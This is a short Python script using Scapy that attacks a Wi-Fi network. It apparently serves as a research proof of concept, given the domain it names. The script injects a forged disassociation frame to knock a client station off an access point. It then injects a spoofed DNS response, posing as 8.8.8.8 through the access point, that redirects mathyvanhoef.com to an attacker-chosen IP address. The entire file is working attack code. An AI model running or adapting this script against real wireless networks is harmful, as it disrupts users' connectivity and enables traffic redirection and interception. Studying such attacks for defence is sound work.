#!/usr/bin/env python3
from scapy.all import *

conf.iface = "wlan1"

addr_sta = "52:20:1d:2b:11:9e"
addr_ap  = "2c:b0:5d:5b:d1:65"
addr_router = "2c:b0:5d:5b:d1:66"

ip_sta = "192.168.1.25"
ip_dns = "8.8.8.8"

p = Dot11(addr1 = addr_ap, addr2=addr_sta, addr3=addr_ap)/Dot11Disas()
sendp(RadioTap()/p)

p = Dot11(addr1 = addr_sta, addr2 = addr_ap, addr3 = addr_router)/LLC()/SNAP()/IP(dst=ip_sta, src=ip_dns)/UDP(dport=38132)/DNS(
	id=0x5868,            # DNS transaction ID
        qr=1,                 # Response flag
        opcode=0,             # Standard query
        aa=0,                 # Authoritative answer
        rd=1,                 # Recursion desired flag
        ra=1,                 # Recursion available flag
        z=0,
        rcode=0,              # No error
        qdcount=1,            # One question
        ancount=1,            # One answer
        nscount=0,
        arcount=0,
	qd=DNSQR(
            qname="mathyvanhoef.com",  # Domain name to spoof
            qtype="A"             # Query type (A record)
        ),
        an=DNSRR(
            rrname="mathyvanhoef.com",  # Domain name to spoof
            type="A",              # Resource record type (A record)
            rclass="IN",           # Record class (Internet)
            ttl=60,                # Time to live (in seconds)
            rdata="172.217.168.243"        # Spoofed IP address
        ))
sendp(RadioTap()/p)

